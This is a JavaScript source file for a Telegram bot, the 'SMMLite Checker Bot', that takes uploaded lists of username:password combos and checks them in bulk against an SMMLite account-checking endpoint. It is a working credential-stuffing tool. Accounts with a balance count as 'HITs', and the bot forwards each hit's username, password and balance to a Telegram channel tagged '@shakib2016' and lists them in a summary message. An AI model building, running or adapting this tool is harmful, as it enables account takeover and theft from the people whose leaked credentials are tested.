// api/telegram.js – SMMLite Checker Bot (batch processing, dynamic base URL)
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const body = req.body;
  if (!body.message) {
    // Telegram may send other updates; we just acknowledge
    return res.status(200).json({ ok: true });
  }

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  // ===== /start command =====
  if (text === '/start') {
    await sendMessage(chatId, 
      "🤖 *SMMLite Checker Bot*\n\n" +
      "Send a `.txt` file with combos (one per line):\n" +
      "`username:password`\n\n" +
      "I'll check all combos in one batch and forward HITs (balance ≥ $0.003) to the channel."
    );
    return res.status(200).json({ ok: true });
  }

  // ===== File upload =====
  if (document && document.mime_type === 'text/plain') {
    // 1. Download file content
    const fileUrl = await getFileUrl(document.file_id);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file from Telegram.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file content.");
      return res.status(200).json({ ok: false });
    }

    // 2. Parse combos
    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx + 1).trim();
      if (user && pass) combos.push(`${user}:${pass}`);
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found (format: `username:password`).");
      return res.status(200).json({ ok: false });
    }

    // 3. Send initial acknowledgment
    await sendMessage(chatId, `📥 Received ${combos.length} combos. Checking in one batch...`);

    // 4. Build the API URL dynamically (uses the same host as the webhook)
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const apiUrl = `${baseUrl}/api/check`;

    try {
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ combos })
      });
      const data = await response.json();
      const results = data.results || [];

      // 5. Separate hits
      const hits = results.filter(r => r.valid && r.hit);
      const total = results.length;

      // 6. Forward each hit to the channel
      for (const hit of hits) {
        const [username, password] = hit.combo.split(':');
        await forwardToChannel(username, password, hit);
      }

      // 7. Send summary
      let summary = `✅ *Checking complete!*\nTotal: ${total}\n💰 HITS: ${hits.length}`;
      if (hits.length > 0) {
        summary += `\n\n📋 *HIT combos:*\n`;
        hits.forEach(h => {
          const [user, pass] = h.combo.split(':');
          summary += `${user}:${pass} | $${parseFloat(h.balance).toFixed(6)}\n`;
        });
      }
      await sendMessage(chatId, summary);

    } catch (err) {
      await sendMessage(chatId, `❌ Error during checking: ${err.message}`);
    }

    return res.status(200).json({ ok: true });
  }

  // Ignore other messages
  return res.status(200).json({ ok: true });
}

// ========== Helper Functions ==========

async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });
  } catch(e) {
    console.error('sendMessage error:', e.message);
  }
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (data.ok && data.result.file_path) {
      return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
    }
  } catch(e) {}
  return null;
}

async function downloadFile(fileUrl) {
  try {
    const res = await fetch(fileUrl);
    return await res.text();
  } catch(e) {
    return null;
  }
}

async function forwardToChannel(username, password, result) {
  if (!TELEGRAM_CHAT_ID) return;
  const balance = parseFloat(result.balance).toFixed(6);
  const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                  `👤 *Username:* ${username}\n` +
                  `🔑 *Password:* \`${password}\`\n` +
                  `💰 *Balance:* $${balance}\n\n` +
                  `#SMMLite @shakib2016 #HIT`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch(e) {}
}
